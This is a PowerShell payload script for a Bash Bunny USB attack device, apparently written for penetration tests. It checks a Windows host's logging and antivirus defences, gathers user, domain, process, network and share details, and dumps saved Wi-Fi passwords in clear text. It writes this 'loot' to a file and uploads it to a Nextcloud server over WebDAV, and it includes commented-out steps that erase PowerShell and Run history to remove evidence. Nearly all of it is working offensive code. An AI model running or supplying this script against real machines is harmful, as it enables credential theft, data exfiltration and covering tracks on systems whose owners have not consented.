<#
    .NOTES
    Version 0.1
    Written By: m1ddl3w4r3
    This script can be used via the bashbunny and upload loot back to the bunny or a Nextcloud Server.
    Comment out the Nextcloud settings to use the bunny upload (Default is Nextcloud Upload for speed of deployment.)
    Change the TARGETDIR variable and FileName variables to suite your needs.
    
    WARNING: This script is meant to deploy the script and be removed.
    I have left the functionality of write back to Bash Bunny if you want it. 
    But, the scripts takes approx 1 min to complete and LED will switch to finished after its deployed, not on write back to bunny.

    NOT OPSEC SAFE
    ##############
    WARNING: For Highly secure enviroments this does alot of recon really fast be aware.
#>
#Server Setttings
$NextCloudURL = "NextCloud URL"
$ShareID = "Share ID"
$SharePass = "Share Password"

# BashBunny loot folder
$bb = (gwmi win32_volume -f 'label=''BashBunny''').Name
$TARGETDIR = "$bb\loot\ADV-Recon\$env:computername"

#Use This For Testing
#$TARGETDIR =  "$env:USERPROFILE\Desktop\$env:COMPUTERNAME" 

#Create Directory
if(!(Test-Path -Path $TARGETDIR )){
    mkdir $TARGETDIR
}
# Local LOOT File 
$FileName = "$env:COMPUTERNAME-$(get-date -f yyyy-MM-dd).log"

########################################################
#Opsec
########################################################
#Audit & Logging
$Audit = REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit  2>$null
$WEF = REG QUERY HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager 2>$null
$SYSMon = Get-Service | where-object {$_.DisplayName -like "*sysmon*"} | Select-Object -Property Status 2>$null

#AV & EDR
$AV = WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName 2>$null
$DFWhite = Get-MpPreference | Select-Object -Property ExclusionPath -ExpandProperty ExclusionPath  2>$null

#Laps
$LPS = REG QUERY "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled 2>$null

#Powershell
$PSv2 = Test-Path "HKLM:\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" 2>$null
$PSv5 = Test-Path "HKLM:\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine" 2>$null

function Get-PSTrans{
    try{
        $PSTrans1 = REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
        return $PSTrans1
    }
    catch{
        return $PSTrans1 = "Transcript Logging Not Enabled"
    }
} 
$PSTrans = (Get-PSTrans)

function Get-ModuleLog{
    try{
        $PSModuleLog1 = REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging
        return $PSModuleLog1
    }
    catch{
        return $PSModuleLog1 = "Module Logging Not Enabled"
    }
}
$PSModuleLog = (Get-ModuleLog)
 
function Get-ScBlkLog{
    try{
        $PSScBlkLog1 = REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
        return $PSScBlkLog1
    }
    catch {
        return $PSScBlkLog1 = "ScriptBlock Logging Not Enabled"
    }
    
}
$PSScBlkLog = (Get-ScBlkLog)
 
#Enviroment
$EN = Get-ChildItem -Path Env: 

#UAC
function Get-UAC{
    try{
        $UAC1 = REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA 
        return $UAC1
    }
    catch{
        return $UAC1 = "UAC Not Enabled"
    }
}
$UAC = (Get-UAC)

########################################################
#User
########################################################

$quser = quser 

#GetEmailAddress
#MicrosoftAccount
function Get-email {
    try {
    $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim() 
	return $email
    }
# If no email is detected function will return backup message for sapi speak
    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return $email = "No Email Detected"
    -ErrorAction SilentlyContinue
    }        
}
$EM = (Get-email | Out-String) 

#Enterprise
$User2Find = $env:USERNAME
$Query = "SELECT * FROM ds_user where ds_sAMAccountName = '$user2find'"
$user = Get-WmiObject -Query $Query -Namespace "root\Directory\LDAP"
$EEM = ($User.DS_mail)

#Privileges
#######################################################

$LA = whoami /all 

########################################################
#Domain
########################################################

function Get-DForest{
    try{
        $DForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest() 
        return $DForest
    }
    catch{
        return $DForest = "Not In a domain Context"
    }
}
$DForest = (Get-DForest)

$NetUser = net user /domain 

$NetGroup = net group /domain 

########################################################
#System
########################################################

$SI = systeminfo 

# Get HDDs
$driveType = @{
   2="Removable disk "
   3="Fixed local disk "
   4="Network disk "
   5="Compact disk "}
$Hdds = Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } 2>$null

# process first
$process= Get-WmiObject win32_process | Select-Object Handle, ProcessName, ExecutablePath, CommandLine 2>$null

# process last
$process = $process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine 2>$null

# service
$service= Get-WmiObject win32_service | Select-Object State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName 2>$null

# installed software
$software= Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize 

########################################################
#Network
########################################################

# Get IP / Network Info
$computerPubIP = (curl ifconfig.me) 2>$null
$HIP = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress 2>$null

# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -notlike $null }  | Select-Object Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 2>$null

#DNSCache
$DNSC = ipconfig /displaydns | findstr "Record" | findstr "Name Host" 2>$null

# Check RDP
if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
	$RDP = "Enabled" 
} else {
	$RDP = "NOT enabled" 
}
#Check WinRM
function Get-WSMan{
    try{
    $WSManE = ($([system.convert]::ToBoolean(((winrm get winrm/config/winrs -r:$ENV:COMPUTERNAME | Where-Object {$_ -imatch "AllowRemoteShellAccess"}).split("="))[1].trim())))
    return $WSManE
    }
    catch{
        return $WSManE = "Not Enabled"
    }
    
}
$WSMan = (Get-WSMan)
#Check SMBV1
$SMBv1C = Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol 2>$null
#Check SMBV2/V3
$SMBv2C = Get-SmbServerConfiguration | Select-Object EnableSMB2Protocol 2>$null
#Get - Com & Serial Devices
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table 2>$null
# Nearby wifi networks
$WLANProfileNames =@()
#Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "
#Trim the output to receive only the name
Foreach($WLANProfileName in $Output){
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()
#Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames){
    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    }Catch{
        $WLANProfilePassword = "The password is not stored in this profile"
    }
    #Build the object and add this to an array
    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject
}

#Get Network Neighbors
$ARP = arp -a  
# Get Listeners / ActiveTcpConnections
$listener = Get-NetTCPConnection | Select-Object @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess 2>$null
$listener = $listener | foreach-object {
    $listenerItem = $_
    $processItem = ($process | Where-Object { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
    new-object PSObject -property @{
      "LocalAddress" = $listenerItem.LocalAddress
      "RemoteAddress" = $listenerItem.RemoteAddress
      "State" = $listenerItem.State
      "AppliedSetting" = $listenerItem.AppliedSetting
      "OwningProcess" = $listenerItem.OwningProcess
      "ProcessName" = $processItem.ProcessName
    }
} | Select-Object LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table 
$NetShare = Get-SmbShare | Format-List

########################################################################################
#OUTPUTS RESULTS TO LOOT FILE
########################################################################################

Clear-Host

#OPSEC
########################################################################################
echo "==================================================================" >> $env:USERPROFILE\$FileName
echo "OPSEC Info: " >> $env:USERPROFILE\$FileName
echo "==================================================================" >> $env:USERPROFILE\$FileName

echo "Logging: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo  $Audit >> $env:USERPROFILE\$FileName

echo ""
echo "Win Event Forwarding: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $WEF >> $env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "Sysmon: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $SYSMon >> $env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "AV: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $AV >> $env:USERPROFILE\$FileName
echo $DFWhite >> $env:USERPROFILE\$FileName

echo "" >>$env:USERPROFILE\$FileName
echo "Laps: " >>$env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $LPS >>$env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "UAC: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $UAC >> $env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "PS Settings: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo "PSv2" >> $env:USERPROFILE\$FileName
echo $PSV2 >> $env:USERPROFILE\$FileName
echo "" >>$env:USERPROFILE\$FileName
echo "PSv5" >> $env:USERPROFILE\$FileName
echo $PSV5 >> $env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "PS Transcript History " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $PSTrans >> $env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "PS Module Logging" >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $PSModuleLog >> $env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "PS ScriptBlock Logging" >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $PSScBlkLog >> $env:USERPROFILE\$FileName

#UserInfo
########################################################################################
echo "" >> $env:USERPROFILE\$FileName
echo "" >> $env:USERPROFILE\$FileName
echo "" >> $env:USERPROFILE\$FileName
echo "==================================================================" >> $env:USERPROFILE\$FileName
echo "User Info: " >> $env:USERPROFILE\$FileName
echo "==================================================================" >> $env:USERPROFILE\$FileName

#Email
echo "" >> $env:USERPROFILE\$FileName
echo "Email: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $EM >> $env:USERPROFILE\$FileName
echo $EEM >> $env:USERPROFILE\$FileName

#Name
echo $LA >> $env:USERPROFILE\$FileName

#DomainInfo
########################################################################################
echo "==================================================================" >> $env:USERPROFILE\$FileName
echo "Domain Info: " >> $env:USERPROFILE\$FileName
echo "==================================================================" >> $env:USERPROFILE\$FileName
echo $DomainInfo >> $env:USERPROFILE\$FileName
echo "" >> $env:USERPROFILE\$FileName
echo "Domain Forest" >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $DForest >> $env:USERPROFILE\$FileName
echo "" >> $env:USERPROFILE\$FileName
echo "Domain User Info: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $NetUser >> $env:USERPROFILE\$FileName
echo "" >> $env:USERPROFILE\$FileName
echo "Domain Group Info: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $NetGroup >> $env:USERPROFILE\$FileName

#SystemInfo
########################################################################################
echo "" >> $env:USERPROFILE\$FileName
echo "" >> $env:USERPROFILE\$FileName
echo "" >> $env:USERPROFILE\$FileName
echo "==================================================================" >> $env:USERPROFILE\$FileName
echo "System Info: " >> $env:USERPROFILE\$FileName
echo "==================================================================" >> $env:USERPROFILE\$FileName
echo $SI >> $env:USERPROFILE\$FileName
echo '' >> $env:USERPROFILE\$FileName
echo "Drives: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $Hdds >> $env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "Enviroment: " >> $env:USERPROFILE\$FileName
echo "############## " >> $env:USERPROFILE\$FileName
echo $EN >> $env:USERPROFILE\$FileName

echo '' >> $env:USERPROFILE\$FileName
echo "Processes: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $process >> $env:USERPROFILE\$FileName

echo '' >> $env:USERPROFILE\$FileName
echo "Services: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $service  >> $env:USERPROFILE\$FileName

echo '' >> $env:USERPROFILE\$FileName
echo "Installed Programs: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $software >> $env:USERPROFILE\$FileName

#Network
########################################################################################
echo "" >> $env:USERPROFILE\$FileName
echo "" >> $env:USERPROFILE\$FileName
echo "" >> $env:USERPROFILE\$FileName
echo "==================================================================" >> $env:USERPROFILE\$FileName
echo "Network Info:" >> $env:USERPROFILE\$FileName
echo "==================================================================" >> $env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "IPs: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo "Public $computerPubIP" >> $env:USERPROFILE\$FileName
echo "Private $HIP" >> $env:USERPROFILE\$FileName
echo "==================================================================" >> $env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "Interfaces: " >>$TARGETDIR\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $Network >> $env:USERPROFILE\$FileName
echo ""  >> $env:USERPROFILE\$FileName
echo "DNSCache: ">> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $DNSC >> $env:USERPROFILE\$FileName
echo "" >> $env:USERPROFILE\$FileName
echo "Network Shares: " >>$env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo $NetShare >> $env:USERPROFILE\$FileName
echo "" >> $env:USERPROFILE\$FileName
echo "Services: " >> $env:USERPROFILE\$FileName
echo "####################" >> $env:USERPROFILE\$FileName
echo "RDP: $RDP" >> $env:USERPROFILE\$FileName
echo "WINRM: $WSMan " >> $env:USERPROFILE\$FileName
echo "SMB: " >> $env:USERPROFILE\$FileName
echo $SMBv1C >> $env:USERPROFILE\$FileName
echo $SMBv2C >> $env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "Com Serial: " >> $env:USERPROFILE\$FileName
echo "==================================================================" >> $env:USERPROFILE\$FileName
echo $COMDevices >> $env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "Nearby Wifi:" >> $env:USERPROFILE\$FileName
echo "==================================================================" >> $env:USERPROFILE\$FileName
echo $WLANProfileNames >> $env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "Stored Wifi:" >> $env:USERPROFILE\$FileName
echo "==================================================================" >> $env:USERPROFILE\$FileName
echo $WLANProfileObjects >> $env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "Local Network:" >> $env:USERPROFILE\$FileName
echo "==================================================================" >> $env:USERPROFILE\$FileName
echo $ARP >> $env:USERPROFILE\$FileName

echo "" >> $env:USERPROFILE\$FileName
echo "Connections:" >> $env:USERPROFILE\$FileName
echo "==================================================================" >> $env:USERPROFILE\$FileName
echo $listener >> $env:USERPROFILE\$FileName

########################################################
# Exfiltrate Loot
########################################################
#Loot web upload to nextcloud server.(Default)
$Item = Get-ChildItem $env:USERPROFILE | Sort-Object LastWriteTime | Select-Object -last 1
$Headers = @{
    "Authorization" = "Basic "+[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$($ShareID):$($SharePass)"));
    "X-Requested-With"="XMLHttpRequest";
    }
$URLBUILD = "$($NextCloudURL)/public.php/webdav/$($Item)"
Invoke-RestMethod -Uri $URLBUILD -InFile $Item.Fullname -Headers $Headers -Method Put 
Move-Item $env:USERPROFILE\$Item $TARGETDIR

########################################################
#CleanUp
########################################################
<#
.NOTES 
	This is to clean up behind you and remove evidence.
    Use it if you want.
    (Probably dont wanna do this if you want your client to be able to find logs)
#>
# Delete Item
#rm $env:USERPROFILE\$Item -r -Force -ErrorAction SilentlyContinue 2>$null
# Delete run box history
#reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 2>$null
# Delete powershell history
#Remove-Item (Get-PSreadlineOption).HistorySavePath 2>$null
# Deletes contents of recycle bin
#Clear-RecycleBin -Force -ErrorAction SilentlyContinue 2>$null
